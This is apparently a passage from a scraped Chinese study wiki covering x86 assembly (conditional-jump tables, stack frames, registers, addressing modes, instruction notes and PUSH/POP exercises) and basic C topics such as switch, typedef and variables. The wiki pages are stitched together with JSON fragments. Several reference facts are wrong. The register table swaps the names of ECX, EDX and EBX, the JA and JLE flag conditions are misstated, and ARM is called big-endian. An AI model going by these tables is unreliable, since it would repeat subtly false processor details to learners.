负-正&lt;=&gt;正+负 负-负&lt;=&gt;正+负 这里不分析了，JCC死记硬背就好了 SF表示有符号整型的最高有效位。(0指示结果为正，反之则为负) OF用于反映有符号数加减运算所得结果是否溢出 正＋正=正，但如果结果是负数，则说明有溢出 负＋负=负，但如果结果是正数，则说明有溢出 正＋负，永远都不会有溢出 TEST TEST指令在两个操作数的对应位之间进行AND操作，并根据运算结果设置符号标志位、零标志位和奇偶标志位。TEST指令与AND指令唯一不同的地方是，TEST指令不修改目标操作数。 TEST指令允许的操作数组合与AND指令相同。 用途 在发现操作数中单个位是否置位（是否是0）时,TEST指令非常有用。 标志位 TEST指令总是清除溢出和进位标志位，其修改符号标志位、零标志位和奇偶标志位的方法与AND指令相同。 Jcc—Jump if Condition Is Met 《白皮书二卷》Jcc—Jump if Condition Is Met小节P660 Checks the state of one or more of the status flags in the EFLAGS register (CF, OF, PF, SF, and ZF) and, if the flags are in the specified state (condition), performs a jump to the target instruction specified by the destination operand. A condition code (cc) is associated with each instruction to indicate the condition being tested for. If the condition is not satisfied, the jump is not performed and execution continues with the instruction following the Jcc instruction. 当执行jcc指令时，jcc指令就是根据标志位相应的值，选择跳转，或继续执行。虽然通常使用比较和跳转的组合来实现条件结构，但别习惯了它们必须成对出现，我可以这里有一行CMP，然后中间修改了标志位，导致我用JZ跳转时看的ZF位已不是由CMP那行决定的。（好像有点废话，感觉这一点不需要记笔记） 一览表 JCC指令 中文含义 英文原意 检查符号位 典型c应用 JZ/JE 若为0则跳转；若相等则跳转 jump if zero;jump if equal ZF=1 if (i == j);if (i == 0); JNZ/JNE 若不为0则跳转；若不相等则跳转 jump if not zero;jump if not equal ZF=0 if (i != j);if (i != 0); JS 若为负则跳转 jump if sign SF=1 if (i &lt; 0); JNS 若为正则跳转 jump if not sign SF=0 if (i &gt; 0); JP/JPE 若1出现次数为偶数则跳转 jump if Parity (Even) PF=1 (null) JNP/JPO 若1出现次数为奇数则跳转 jump if not parity (odd) PF=0 (null) JO 若溢出则跳转 jump if overflow OF=1 (null) JNO 若无溢出则跳转 jump if not overflow OF=0 (null) JC/JB/JNAE 若进位则跳转；若低于则跳转；若不高于等于则跳转 jump if carry;jump if below;jump if not above equal CF=1 if (i &lt; j); JNC/JNB/JAE 若无进位则跳转；若不低于则跳转；若高于等于则跳转 jump if not carry;jump if not below;jump if above equal CF=0 if (i &gt;= j); JBE/JNA 若低于等于则跳转；若不高于则跳转 jump if below equal;jump if not above ZF=1或CF=1 if (i &lt;= j); JNBE/JA 若不低于等于则跳转；若高于则跳转 jump if not below equal;jump if above ZF=0或CF=0 if (i &gt; j); JL/JNGE 若小于则跳转；若不大于等于则跳转 jump if less;jump if not greater equal SF != OF if (si &lt; sj); JNL/JGE 若不小于则跳转；若大于等于则跳转 jump if not less;jump if greater equal SF=OF if (si &gt;= sj); JLE/JNG 若小于等于则跳转；若不大于则跳转 jump if less equal;jump if not greater ZF != OF 或 ZF=1 if (si &lt;= sj); JNLE/JG 若不小于等于则跳转；若大于则跳转 jump if not less equal;jump if greater SF=OF 且 ZF=0 if(si&gt;sj) 条件跳转指令类型 《汇编语言-基于x86处理器第七版》P157 基于特定标志位值的跳转 助记符 说明 标志位/寄存器 助记符 说明 标志位/寄存器 JZ 为零跳转 ZF=1 JNO 无溢出跳转 OF=0 JNZ 非零跳转 ZF=0 JS 有符号跳转 SF=1 JC 进位跳转 CF=1 JNS 无符号跳转 SF=0 JNC 无进位跳转 CF=0 JP 偶校验跳转 PF=1 JO 溢出跳转 OF=1 JNP 奇校验跳转 PF=0 相等性的比较 助记符 说明 JE 相等跳转（leftOp=rightOp） JNE 不相等跳转（leftOp≠rightOp） JCXZ CX=0跳转 JECXZ ECX=0跳转 JRCXZ RCX=0跳转（64位模式） 尽管JE指令相当于JZ(为零跳转)，JNE指令相当于JNZ(非零跳转)，但是，最好是选择最能表明编程意图的助记符(JE或JZ),以便说明是比较两个操作数还是检查特定的状态标志位。 无符号数比较 助记符 说明 助记符 说明 JA 大于跳转（若leftOp＞rightOp） JB 小于跳转（若leftOp＜rightOp） JNBE 不小于或等于跳转（与JA相同） JNAE 不大于或等于跳转（与JB相同） JAE 大于或等于跳转（若leftOp≥rightOp） JBE 小于或等于跳转（若leftOp≤rightOp） JNB 不小于跳转（与JAE相同） JNA 不大于跳转（与JBE相同） 有符号数比较 助记符 说明 助记符 说明 JG 大于跳转（若leftOp＞rightOp） JL 小于跳转（若leftOp＜rightOp） JNLE 不小于或等于跳转（与JG相同） JNGE 不大于或等于跳转（与JL相同） JGE 大于或等于跳转（若leftOp≥rightOp） JLE 小于或等于跳转（若leftOp≤rightOp） JNL 不小于跳转（与JGE相同） JNG 不大于跳转（与JLE相同）"},{"title":"过程","path":"/wiki/Assembly_Language/过程.html","content":"编程语言用不同的术语来指代子程序。例如，在C和C++中，子程序被称为函数（functions）。在Java中，被称为方法(methods)。在MASM中，则被称为过程（procedures）。 定义 函数就是一系列指令的集合，为了完成某个会重复使用的特定功能。 如果使用jmp来调用函数，假设地址A和地址B都调用这个函数，调用完后没法返回到相应调用者下一行指令，所以用call和ret指令来调用函数，以此实现调用完还能回到原来的地址继续执行。 参数 寄存器传参 假设写函数时约定好这个函数用eax、ecx作为入口参数，用eax作为返回值 堆栈传参 如果传递的参数要特别多，而寄存器数量又是有限的。于是用堆栈传参，在调用函数前将参数压入堆栈。 堆栈平衡 堆栈平衡指两个方面 函数调用结束，准备执行ret指令时，ESP指向的内容需是调用该函数时压入的下一行指令的地址，否则回不去了，程序会出错 如果通过堆栈传参，当函数调用完毕返回后，堆栈须与调用函数前一致。 关于第1点 函数内部使用了堆栈但没平衡，导致ret弹栈时eip被赋错值。 关于第2点 例如下语句在main中调用AddTwo： 123push 6push 5call AddTwo 调用结束返回后，AddTwo有两个参数留在堆栈中，下图为调用返回后的堆栈。这两个值已经没用到了，必须将参数从堆栈中删除，在这里会白白占用堆栈空间。多次调用函数后，这些已经没用的垃圾数值会占用堆栈的空间，导致堆栈空间溢出。 外平栈 在call指令外使用add指令平衡堆栈 内平栈 给RET指令添加一个整数参数，使得程序在返回到调用过程时，ESP会加上数值8。 小结 对于第一种情况我们可以在函数内使用完堆栈后，POP释放数据；对于第二种堆栈传参导致的堆栈不平衡，我们可以使用外平栈、内平栈两种方法。 堆栈寻址 ESP寻址 使用ESP寻址，形如 1mov eax, dword ptr ss:[esp+4] 缺点：当函数内部也使用到堆栈时，因为esp变了，为了寻到同一块堆栈地址，esp+的偏移要计算，比较麻烦。 EBP寻址 堆栈帧（stack frame)(或活动记录（activation record)）是一块堆栈保留区域，用于存放被传递的实际参数、子程序的返回值、局部变量以及被保存的寄存器。堆栈帧的创建步骤如下所示: 被传递的实际参数。如果有，则压入堆栈。 当子程序被调用时，使该子程序的返回值压入堆栈。 子程序开始执行时，EBP被压入堆栈。 设置EBP等于ESP。从这时开始,EBP就变成了该子程序所有参数的引用基址。 如果有局部变量，修改ESP以便在堆栈中为这些变量预留空间。 如果需要保存寄存器，就将它们压入堆栈。 1234567891011push ebpmov ebp,esp;push a ;如果有要保存的寄存器;push bxxx ;函数内部xxx ;函数内部;pop b ;ret前记得平衡堆栈;pop amov esp,ebppop ebpretn 在整个函数过程中，ebp的位置不变，一直指示着栈帧的底部，使用[ebp+偏移]的方式对参数进行寻址。"},{"title":"通用寄存器_内存读写","path":"/wiki/Assembly_Language/通用寄存器_内存读写.html","content":"通用寄存器 寄存器 名字 用途 编号 数据存储范围 EAX Extended Accumulator（扩展累加器） 累加器 0 0 - 0xFFFFFFFF ECX Extended Base（扩展基址） 计数 1 0 - 0xFFFFFFFF EDX Extended Counter（扩展计数器） I/O指针 2 0 - 0xFFFFFFFF EBX Extended Data（扩展数据） DS段的数据指针 3 0 - 0xFFFFFFFF ESP Extended Stack Pointer（扩展堆栈指针） 堆栈指针 4 0 - 0xFFFFFFFF EBP Extended Base Pointer（扩展基址指针） SS段的数据指针 5 0 - 0xFFFFFFFF ESI Extended Source Index（扩展源索引） 字符串操作的源指针；SS段的数据指针 6 0 - 0xFFFFFFFF EDI Extended Destination Index（扩展目的索引） 字符串操作的目标指针；ES段的数据指针 7 0 - 0xFFFFFFFF 按编号顺序记住寄存器，EAX-0，ECX-1，… 用途只是官方说明及建议使用的方式，实际上程序员清楚自己怎么用就行 EAX、ECX、EDX、EBX的16位，高8位，低8位可单独使用 32位 16位 8位 EAX AX AH、AL ECX CX CH、CL EDX DX DH、DL EBX BX BH、BL ESP SP EBP BP ESI SI EDI DI 内存 这里的内存是指进程的线性地址空间，而不是硬件的内存条空间。 在内存存储中，内存单元是字节单元（一个单元存放一个字节），假如1个存储器有128个存储单元，编号0~127，这个编号称为内存地址。每个内存地址（编号）存储1个字节（8位）。 内存地址空间由CPU地址总线宽度决定，80386CPU的地址总线宽度为32。 可以传送232个不同的地址信息（大小从0至232-1），即可以定位232个内存单元，内存地址编号范围：0-0xFFFFFFFF 有0xFFFFFFFF+1个存储单元（内存地址0也算一个存储单元），能存储(0xFFFFFFFF+1)×8个位，/8=0x100000000个字节，/1024/1024/1024=4GB。 或直接232=4GB 要完整描述一个内存单元，需要两个信息： 内存单元的地址 内存单元的长度（类型） 寻址方式 当数据存放在内存中时，我们可以用多种方式来给定这个内存单元的偏移地址，这种定位内存单元的方法一般被称为寻址方式。有5种： 形式一：立即数 直接寻址 12345678// 读取内存的值mov eax, dword ptr ds:[0x13FFC4] // 向内存中写入数据mov dword ptr ds:[0x13FFC4], eax// 获取内存编号lea eax,dword ptr ds:[0x13FFC4] 形式二：[reg] reg表示寄存器，可以是8个通用寄存器中的任意一个 寄存器间接寻址 12345678910// 读取内存的值mov ecx, 0x13FFD0mov eax, dword ptr ds:[ecx] // 向内存中写入数据mov edx, 0x13FFD8mov dword ptr ds:[edx], 0x87654321// 获取内存编号lea eax, dword ptr ds:[edx] 形式三：[reg+立即数] 寄存器相对寻址 12345678910// 读取内存的值mov ecx, 0x13FFD0mov eax, dword ptr ds:[ecx+4] // 向内存中写入数据mov edx, 0x13FFD8mov dword ptr ds:[edx+0xC], 0x87654321// 获取内存编号lea eax,dword ptr ds:[edx+4] 形式四：[reg+reg*{1,2,4,8}] 基址变址寻址 1234567891011121314// 读取内存的值mov eax, 0x13FFC4mov ecx, 0x2mov edx, dword ptr ds:[eax+eax*4] // 向内存中写入数据mov eax, 0x13FFC4mov ecx, 0x2mov dword ptr ds:[eax+eax*4], 0x87654321// 获取内存编号lea eax,dword ptr ds:[eax+ecx*4] 形式五：[reg+reg*{1,2,4,8}+立即数] 相对基址变址寻址 1234567891011121314// 读取内存的值mov eax, 0x13FFC4 mov ecx, 0x2mov edx, dword ptr ds:[eax+ecx*4+4] // 向内存中写入数据mov eax, 0x13FFC4mov ecx, 0x2mov dword ptr ds:[eax+ecx*4+4], 0x87654321// 获取内存编号lea eax,dword ptr ds:[eax+ecx*4+2] 存储方式 大端模式：数据高位存储在低位地址中，数据低位存储在高位地址中； 小端模式：数据低位存储在低位地址中，数据高位存储在高位地址中。 比如有1个数据，0x1A2B，1A是这个数据的高位，2B是低位，按字节划分的。比如有2个地址，0x00000000，和0x00000001，0x00000000是低地址，0x00000001是高地址。 1mov word ptr ds:[0x00000000], 0x1A2B 如果是大端模式存储： 内存地址 内存中的值 0x00000000 1A 0x00000001 2B … 0xFFFFFFFF 如果是小端模式存储： 内存地址 内存中的值 0x00000000 2B 0x00000001 1A … 0xFFFFFFFF 在80x86处理器上，绝大部分的应用数据存储都是采用小端模式；在ARM上则是大端模式。 《汇编语言-王爽》 字单元的概念：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位地址，低地址内存单元中存放字型数据的低位地址。 我们将起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2，我们可以说这是2地址字单元。"},{"title":"汇编指令","path":"/wiki/Assembly_Language/汇编指令.html","content":"汇编指令 指令操作数符号 白皮书二卷P115页3.1.1.3 操作数 说明 reg 通用寄存器 m 内存 imm 立即数 r8 8位通用寄存器 m8 8位内存操作数 imm8 8位立即数 以此类推 MOV 将源操作数复制到目标操作数；源操作数不会发生改变 1mov destination,source 操作数 12345MOV reg,regMOV mem,regMOV reg,memMOV mem,immMOV reg,imm 两个操作数的宽度必须同等大小 两个操作数不能同时为内存操作数 指令指针寄存器（IP、EIP或RIP）不能作为目的操作数 XCHG XCHG(交换数据)指令交换两个操作数内容。 123XCHG reg,regXCHG reg,memXCHG mem,reg 例 123XCHG AL,CLXCHG DWORD PTR DS:[12FFC4],EAXXCHG BYTE PTR DS:[12FFC4],AL OFFSET运算符 《汇编语言-基于x86处理器第七版》P87 OFFSET运算符返回数据标号的偏移量。这个偏移量按字节计算，表示的是该数据标号距离数据段起始地址的距离。 如下图所示为数据段内名为myByte的变量。 示例 12345.databVal BYTE ?wVal WORD ?dVal DWORD ?dVal2 DWORD ? 假设bVal在偏移量为0040 4000(十六进制)的位置，则OFFSET运算符返回值如下: 12345 偏移mov esi,OFFSET bVal ;ESI =00404000h 0mov esi,OFFSET wVal ;ESI =00404001h BYTEmov esi,OFFSET dVal ;ESI =00404003h BYTE+WORDmov esi,OFFSET dVal2 ;ESI =00404007h BYTE+WORD+DWORD LEA指令 《汇编语言-基于x86处理器第七版》P236 LEA指令返回间接操作数的地址。由于间接操作数中包含一个或多个寄存器，因此会在运行时计算这些操作数的偏移量。 为了演示如何使用LEA，现在来看下面的C++程序,该程序声明了一个局部数组 myString，并引用它来分配数组值: 123456void makeArray()&#123; char myString[30]; for(int i=0;i&lt;30;i++) myString[i]=&#x27;*&#x27;;&#125; 与之等效的汇编代码在堆栈中为myString分配空间，并将地址——间接操作数——赋给ESI。虽然数组只有30个字节，但是ESP还是递减了32以对齐双字边界。注意如何使用LEA把数组地址分配给ESI: 12345678910111213makeArray PROC push ebp mov ebp,esp sub esp,32 ;myString位于EBP-30的位置 lea esi,[ebp-30] ;加载myString的地址 mov ecx,30 ;循环计数器L1: mov BYTE PTR [esi],&#x27;*&#x27; ;填充一个位置 inc esi ;指向下一个元素 loop L1 ;循环，直到ECX=0 add esp,32 ;删除数组（恢复ESP） pop ebp retmakeArray ENDP 与OFFSET运算符的区别 不能用OFFSET获得堆栈参数的地址，因为OFFSET只适用于编译时已知的地址。下面的语句无法汇编: 1mov esi,OFFSET [ebp-30] ;错误 ADD 将源操作数与目标操作数相加之和，存入目标操作数；源操作数不会发生改变 1add destination,source 操作数 1234567891011ADD r/m8, imm8ADD r/m16,imm16ADD r/m32,imm32ADD r/m16, imm8ADD r/m32, imm8ADD r/m8, r8ADD r/m16, r16ADD r/m32, r32ADD r8, r/m8ADD r16, r/m16ADD r32, r/m32 标志位 影响进位标志位、零标志位、符号标志位、溢出标志位、辅助进位标志位、奇偶标志位，根据存入目标操作数的数值进行变化 ADC ADC(带进位加法)指令将源操作数和进位标志位的值都与目的操作数相加。 功能：操作对象1=操作对象1+操作对象2+CF 12345ADC reg,regADC mem,regADC reg,memADC mem,immADC reg,imm 例 1ADC AL,CL 1ADC BYTE PTR DS:[12FFC4],2 1ADC BYTE PTR DS:[12FFC4],AL SUB 目标操作数减去源操作数，结果存入目标操作数；源操作数不会发生改变 1sub destination,source 操作数 1234567891011SUB r/m8, imm8SUB r/m16,imm16SUB r/m32,imm32SUB r/m16, imm8SUB r/m32, imm8SUB r/m8, r8SUB r/m16, r16SUB r/m32, r32SUB r8, r/m8SUB r16, r/m16SUB r32, r/m32 标志位 影响进位标志位、零标志位、符号标志位、溢出标志位、辅助进位标志位、奇偶标志位，根据存入目标操作数的数值进行变化 SBB SBB(带借位减法）指令从目的操作数中减去源操作数和进位标志位的值。允许使用的操作数与ADC指令相同。 功能：操作对象1=操作对象1-操作对象2-CF 例 1SBB AL,CL 1SBB BYTE PTR DS:[12FFC4],2 1SBB BYTE PTR DS:[12FFC4],AL PTR运算符 类型转换运算符，用于指定操作数的大小或类型。PTR运算符可以用于强制将一个操作数解释为特定类型的指针，这样可以确保正确的内存大小被访问。 用途一 用来重写一个已经被声明过的操作数的大小类型。 例如，假设想要将一个双字变量myDouble的低16位传送给AX。由于操作数大小不匹配，因此，汇编器不会允许这种操作: 12345.datamyDouble DWORD 12345678h.codemov ax,myDouble 但是,使用WORD PTR运算符就能将低位字（5678h)送入AX: 1mov ax,WORD PTR myDouble 用途二 一个操作数的大小可能无法从指令中直接看出来，要用PTR运算符确认操作数的大小类型。 比如，在向内存传立即数时，要用PTR声明用多大的内存 1mov BYTE PTR ds:[0x12345678],1234h PTR必须与一个标准汇编数据类型一起使用，这些类型包括：BYTE、SBYTE、WORD、SWORD、DWORD、SDWORD、FWORD、QWORD或TBYTE 位运算指令 AND 两个操作数的对应位之间进行（按位）逻辑与（AND）操作，结果存放在目标操作数中；源操作数不会发生改变 1and destination,source 操作数 12345AND reg,regAND reg,memAND reg,immAND mem,regAND mem,imm 两个操作数必须同等大小 标志位 总是清除溢出和进位进位标志位，并根据目标操作数的值来修改符号标志位、零标志位、奇偶标志位。 OR 两个操作数的对应位之间进行（按位）逻辑或（OR）操作，结果存放在目标操作数中；源操作数不会发生改变 1or destination,source 操作数 12345OR reg,regOR reg,memOR reg,immOR mem,regOR mem,imm 两个操作数必须同等大小 标志位 总是清除溢出和进位进位标志位，并根据目标操作数的值来修改符号标志位、零标志位、奇偶标志位。 XOR 两个操作数的对应位之间进行（按位）逻辑异或（XOR）操作，结果存放在目标操作数中；源操作数不会发生改变 1xor destination,source 操作数 12345XOR reg,regXOR reg,memXOR reg,immXOR mem,regXOR mem,imm 两个操作数必须同等大小 标志位 总是清除溢出和进位进位标志位，并根据目标操作数的值来修改符号标志位、零标志位、奇偶标志位。 NOT 翻转操作数中的所有位。 操作数 12NOT regNOT mem 标志位 不影响标志位。 移位指令 指令 含义 SHL 左移 Shift Left SHR 右移 Shift Right SAL 算数左移 Shift Arithmetic Left SAR 算数右移 Shift Arithmetic Right ROL 循环左移 Rotate Left ROR 循环右移 Rotate Right RCL 带进位的循环左移 Rotate through Carry Left RCR 带进位的循环右移 Rotate through Carry Right SHL SHL(左移)指令使目的操作数逻辑左移一位，最低位用0填充。最高位移入进位标志位,而进位标志位中原来的数值被丢弃: SHL的第一个操作数是目的操作数,第二个操作数是移位次数: 1SHL destination,count 该指令可用的操作数类型如下所示： 1234SHL reg,imm8SHL mem, imm8SHL reg, CLSHL mem, CL x86处理器允许imm8为0～255中的任何整数。另外，CL寄存器包含的是移位计数。上述格式同样适用于SHR、SAL、SAR、ROR、ROL、RCR和RCL指令。 SHR SHR（右移)指令使目的操作数逻辑右移一位，最高位用0填充。最低位复制到进位标志位,而进位标志位中原来的数值被丢弃: SAL SAL(算术左移）指令的操作与SHL指令一样。每次移动时，SAL都将目的操作数中的每一位移动到下一个最高位上。最低位用0填充;最高位移入进位标志位，该标志位原来的值被丢弃: 对于有符号数或无符号数，用SAL或SHL指令其实一样的，都是低位补0，最高位移到CF。 SAR SAR（算术右移)指令将目的操作数进行算术右移: ROL ROL(循环左移）指令把所有位都向左移。最高位复制到进位标志位和最低位。指令格式与SHL指令相同: ROR ROR(循环右移)指令把所有位都向右移，最低位复制到进位标志位和最高位。该指令格式与SHL指令相同: RCL RCL(带进位循环左移）指令把每一位都向左移，进位标志位复制到LSB，而MSB复制到进位标志位: RCR RCR(带进位循环右移）指令把每一位都向右移，进位标志位复制到MSB,而LSB复制到进位标志位: 字符串操作指令 MOVS指令 传送字符串数据：将ESI指向的内存位置复制到EDI指向的内存位置。ESI和EDI自增或自减，由方向标志位的值决定。可使用重复前缀。 指令 完整形式 含义 ESI和EDI增加或减少的数值 MOVSB MOVS BYTE PTR ES:[EDI], BYTE PTR DS:[ESI] 传送（复制）字节 1 MOVSW MOVS WORD PTR ES:[EDI], WORD PTR DS:[ESI] 传送（复制）字 2 MOVSD MOVS DWORD PTR ES:[EDI], DWORD PTR DS:[ESI] 传送（复制）双字 4 STOS指令 保存字符串数据：将累加器的内容保存到EDI寻址的内存位置。EDI根据方向标志位的值自增或自减。可使用重复前缀。 指令 完整形式 含义 EDI增加或减少的数值 STOSB STOS BYTE PTR ES:[EDI] 将AL的值储存到EDI指定的内存地址 1 STOSW STOS WORD PTR ES:[EDI] 将AX的值储存到EDI指定的内存地址 2 STOSD STOS DWORD PTR ES:[EDI] 将EAX的值储存到EDI指定的内存地址 4 方向标志位DF 可用CLD和STD指令显式修改方向标志位。 12CLD;方向标志位清零（正向）STD;方向标志位置1（反向） 方向标志位的值 对ESI和EDI的影响 地址顺序 0 增加 低到高 1 减少 高到低 REP指令 重复前缀,REP ECX&gt;0时重复。每执行一次，ECX寄存器中的值减一，直至为零。 123456REP MOVSBREP MOVSWREP MOVSDREP STOSBREP STOSWREP STOSD 示例：复制字符串 下面的例子中，MOVSB从string1传送10个字节到string2。重复前缀在执行MOVSB指令之前，首先测试ECX是否大于0。若ECX=0，MOVSB指令被忽略，控制传递到程序的下一行代码；若ECX&gt;0，则ECX减1并重复执行MOVSB指令： 12345cld ;清除方向标志位mov esi, OFFSET Stringl ;ESI指向源串mov edi, OFFSET string2 ;EDI执行目的串mov ecx,10 ;计数器赋值为10rep movsb ;传送10个字节 堆栈 进程线性地址空间4GB中一块特殊的内存。 堆栈使用，由高地址向低地址方向使用。 用DTDebug随便打开一个程序，查看fs.base的值，然后在内存窗口输入dd 3003000查看，就能看到堆栈的地址范围 栈顶：02F30000。栈底：02F1F000。将堆栈窗口拉到顶部和底部，可以证实。02F2FFFC占4字节，+4，就是02F30000 ESP栈顶指针总是指向最后压入堆栈的数据项。EBP栈底指针表示当前使用堆栈的第一个地址。 ESP-EBP，就知道这个堆栈使用了多少内存空间。 要读取堆栈中的某个数据时，既可以通过ESP加偏移，也可以通过EBP加偏移的方式来寻址。 debug编译的exe为EBP寻址，release的为ESP寻址。 堆栈应用 运行时堆栈在程序中有一些重要用途: 当寄存器用于多个目的时,堆栈可以作为寄存器的一个方便的临时保存区。在寄存器被修改后,还可以恢复其初始值。 执行CALL指令时,CPU在堆栈中保存当前过程的返回地址。 调用过程时,输入数值也被称为参数，通过将其压入堆栈实现参数传递。 堆栈也为过程局部变量提供了临时存储区域。 PUSH 先减少ESP的值，再将源操作数复制到堆栈。 操作数是16位的，则ESP减2 操作数是32位的，则ESP减4 1234;不能push al ;不能push 8位的寄存器/内存PUSH reg/mem16PUSH reg/mem32PUSH imm8/imm16/imm32\t;立即数都是-4字节 等价指令 压栈做了两件事： 抬栈 将源操作数复制到堆栈 抬栈的等价指令： sub esp,0x4 lea esp,dword ptr ss:[esp-4] 将源操作数复制到堆栈的等价指令： mov dword ptr ss:[esp-4],0xAAAAAAAA，然后抬栈 先抬栈后，mov dword ptr ss:[esp],0xAAAAAAAA 组合一下，如果是先抬栈，然后将源操作数复制到堆栈 等价指令1： 12sub esp,0x4mov dword ptr ss:[esp],0xAAAAAAAA 等价指令2： 12lea esp,dword ptr ss:[esp-4]mov dword ptr ss:[esp],0xAAAAAAAA 如果是将源操作数复制到堆栈，然后再抬栈 等价指令1： 12mov dword ptr ss:[esp-4],0xAAAAAAAAsub esp,0x4 等价指令2： 12mov dword ptr ss:[esp-4],0xAAAAAAAAlea esp,dword ptr ss:[esp-4] POP 先把ESP指向的堆栈元素内容复制到目的操作数中，再增加ESP的值。 操作数是16位的，则ESP加2 操作数是32位的，则ESP加4 12POP reg/mem16POP reg/mem32 不需要这个数据时，直接下降栈顶指针ESP 1add esp, 0x4 1lea esp,dword ptr ss:[esp+4] 作业 使用2种方式实现：push esp 答案方式一：12lea eax,dword ptr ss:[esp]push eax ;分成两步，用等价指令也可以，我这里偷懒了方式二：12mov dword ptr ss:[esp-4],esplea esp,dword ptr ss:[esp-4] ;sub exp,0x4也可以 使用2种方式实现：pop esp 答案如果执行pop esp，它做了两件事：降栈，esp的值是堆栈里弹出来的值不过其实esp值被改了，平栈操作其实没啥意义，算是题目的局限性吧方式一：12add esp,4mov esp,dword ptr ss:[esp-4]方式二：123mov eax,dword ptr ss:[esp]add esp,4mov esp,eax PUSHAD pushad指令按照EAX，ECX，EDX，EBX，ESP（执行PUSHAD之前的值），EBP，ESI和EDI的顺序，将所有32位通用寄存器压入堆栈。 popad指令按相反顺序将寄存器弹出堆栈。 上边寄存器的顺序就是之前文章写的要记住的编号顺序，也是OD从上往下显示的顺序。 与之相似，PUSHA指令按序（AX、CX、DX、BX、SP、BP、SI和DI)将16位通用寄存器压入堆栈。POPA指令按照相反顺序将同样的寄存器弹出堆栈。在16位模式下，只能使用PUSHA和POPA指令。 PUSHFD PUSHFD指令把32位EFLAGS寄存器内容压入堆栈，而POPFD指令则把栈顶单元内容弹出到EFLAGS寄存器。 修改EIP的指令 JMP 修改EIP的值为指定的指令地址. 无条件跳转到目标地址。海哥说跟这个没关系，记住修改eip就行，然后CPU根据eip决定下一条执行的指令。 1JMP 寄存器/立即数/内存 在含义上好似：mov IP,ax.（并不是说真有mov IP,ax这样的指令，而是用mov指令的语法来说明jmp指令的功能）。 CALL 与JMP唯一的区别：在堆栈中存储call指令的下一行地址。 CALL指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的RET指令从堆栈把返回地址弹回到指令指针寄存器。 1CALL 寄存器/立即数/内存 在含义上好似： 12push 地址B ;当前eip地址+指令长度=下一条要执行指令的地址MOV EIP,地址A/寄存器 RET 1RET 在含义上好似： 1234add esp,4mov eip,[esp-4] ;或LEA ESP,[ESP+4];或pop eip （并不是说真有mov IP,ax这样的指令，而是用mov指令的语法来说明ret修改eip的功能）。"},{"title":"Switch语句","path":"/wiki/C/Switch语句.html","content":"正向 12345678910111213141516switch(表达式)&#123; case 常量表达式1: 语句; break; case 常量表达式: 语句; break; case 常量表达式: 语句; break; ...... default: 语句; break;&#125; 表达式结果不能是浮点数 case后的值必须是常量 case后的常量不能一样 break break的作用是跳到switch语句块的末尾。当满足其中一个case，便会执行那个case里的语句。如果没有break，就会继续向下执行。 例 case 1不成立，往下接着判断。case 2成立，执行，因为没有break，接着往下走。此后不会再将2和3比较，而是执行printf(&quot;C &quot;)，因为没有break，接着往下走，执行printf(&quot;D &quot;)。碰到break了，跳出switch语句块。 1234567891011121314151617181920int x = 2;switch (x)&#123; case 1: printf(&quot;A &quot;); break; case 2: printf(&quot;B &quot;); //break; case 3: printf(&quot;C &quot;); //break; case 4: printf(&quot;D &quot;); break; default: printf(&quot;default &quot;); break;&#125; 条件合并 是1是2，做的事一样，可以这样写： 1234567891011121314151617181920int x = 3;switch (x)&#123; case 1: case 2: printf(&quot;A &quot;); break; case 3: printf(&quot;C &quot;); // break; case 4: printf(&quot;D &quot;); break; default: printf(&quot;default &quot;); break;&#125;return 0; default default是所有case都不满足就执行。一般写在最后是出于可读性的考虑，也可以写在前边，它与位置无关。但当default写在其他条件的前面时，如果没有break，还是会向下继续执行 和if…else语句的区别 switch语句只能进行等值判断（仅能支持常量表达式），而if…else可以进行区间判断（表达式、常量…都可以） switch语句的执行效率远远高于if…else，在分支条件比较多的情况下，这种趋势愈发明显 用途 在游戏中，比如快捷键操作，F1打坐，F2加红，F3加蓝，F4释放技能。假设这些快捷键都对应一个常量，在游戏中，因为switch的高效，会用switch语句来对应快捷键下的call 1234567891011121314151617181920F1 F2 F3 F4 F5 F6 F7 F8 0 1 2 3 4 5 6 7 switch(表达式) &#123; case 1: 打坐.... break; case 2: 加红.... break; case 3: 加蓝.... break; case 4: 释放技能.... break; default: 语句; break;\t&#125;"},{"title":"typedef","path":"/wiki/C/typedef.html","content":"利用typedef可以为某一类型自定义名称。 简单一些的声明 对已有类型定义别名 123typedef unsigned char BYTE; typedef unsigned short WORD; typedef unsigned int DWORD; typedef用于结构 12345678910typedef struct complex&#123; float real; float imag;&#125;COMPLEX;//随后就可以用COMPLEX来声明结构体变量COMPLEX a;//当然，原有的也能用struct complex b; 用typedef来命名一个结构类型时，可以省略该结构的标签 12345typedef struct&#123; double x; double y;&#125;rect; 123456789101112131415rect r1 = &#123;3.0, 6.0&#125;;rect r2;// 以上代码将被翻译成struct&#123; double x; double y;&#125;r1 = &#123;3.0, 6.0&#125;;struct&#123; double x; double y;&#125;r2; 复杂一些的声明 一维数组类型的定义格式 1234567891011121314typedef int vector[10]; int main(int argc, char* argv[]) &#123; vector v; v[0] = 1; v[1] = 2; v[2] = 3; v[3] = 4; v[4] = 5; return 0; &#125; 二维数组类型的定义格式 123456789101112131415161718typedef int matrix[5][5]; typedef int nameTable[5][5][5]; int main(int argc, char* argv[]) &#123; matrix v; nameTable n; v[0][0] = 1; v[0][1] = 2; v[0][2] = 3; v[0][3] = 4; v[0][4] = 5; n[0][0][0] = 1; return 0; &#125; 函数指针 1typedef int (*Fun)(int,int); 这个不是变量的声明，而是为函数指针起个别名：Fun，它是函数指针类型 1Fun p; 这个才是变量的声明，p是变量，Fun是类型"},{"title":"全局变量和局部变量","path":"/wiki/C/全局变量和局部变量.html","content":"变量声明（正向） 1变量类型 变量名; 变量的命名规范与函数名、参数名一样： 只能以字母、数字、下划线组成；且第一个字母必须是字母或下划线。 命名严格区分大小写 不能使用C语言的关键字（例如：void、return之类） 变量类型用来说明数据宽度 数据类型 数据宽度 int 4个字节 short 2个字节 char 1个字节 变量名实际是内存地址的别名，由编译器负责将变量名和内存地址之间的转换 如何理解声明和赋值？ 声明变量就是告诉计算机，我要用一块内存，你给我留着，宽度和存储格式由数据类型决定。 计算机什么时候把这块内存给你，取决于变量的作用范围，如果是全局变量，在程序编译完就已经分配了空间，如果是局部变量，只有所在的程序被调用的时候，才会分配空间。全局变量如果不赋初始值，默认是0，但局部变量在使用前一定要赋初值。 两类变量 全局变量和局部变量。变量名就是内存地址的别名。 全局变量 